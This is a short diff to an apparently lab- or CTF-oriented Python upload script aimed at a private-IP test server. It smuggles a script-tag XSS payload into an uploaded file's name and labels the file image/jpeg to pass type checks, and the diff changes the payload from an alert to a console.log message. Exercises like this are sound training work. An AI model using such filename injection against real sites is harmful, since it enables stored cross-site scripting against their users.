@@ -7,7 +7,7 @@ page = 'http://192.168.56.101/?page=upload'
 def uploading(page):
     f = {
         'uploaded':                             # name of the file input on the web page.
-            ("<script>alert('xss')</script>",   # It contains a script tag with an alert function, which will trigger an XSS alert when executed by the browser.
+            ("<script>console.log('NU VY LOHI HAHAHA')</script>",   # It contains a script tag with an alert function, which will trigger an XSS alert when executed by the browser.
                 'file_contents',                # 'image/jpeg': This is the file's MIME type, specifying that it is a JPEG image
                 'image/jpeg')                   # type of file
         }
